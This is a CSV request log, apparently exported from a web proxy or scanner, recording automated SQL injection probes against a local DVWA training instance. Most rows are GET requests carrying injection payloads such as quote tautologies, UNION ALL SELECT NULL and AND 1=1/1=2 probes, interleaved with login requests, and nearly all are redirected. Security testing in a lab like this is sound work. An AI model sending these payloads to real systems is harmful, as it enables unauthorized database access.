ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
1887,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%29+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,1,628,0
1888,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
1889,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%29+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,1,628,0
1890,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
1891,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%27,302,Found,1,628,0
1892,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
1893,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27,302,Found,0,628,0
1895,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
1894,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22,302,Found,1,628,0
1896,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
1897,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22,302,Found,1,628,0
1899,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3B,302,Found,1,628,0
1898,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
1900,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3B,302,Found,1,628,0
1901,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
1902,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%27%28,302,Found,0,628,0
1903,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
1904,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%28,302,Found,1,628,0
1906,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
1905,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
1907,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
1908,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
1909,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit+AND+1%3D1+--+,302,Found,1,628,0
1910,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
1911,Thu Mar 19 12:03:21 CST 2026,Thu Mar 19 12:03:21 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit+AND+1%3D2+--+,302,Found,1,628,0
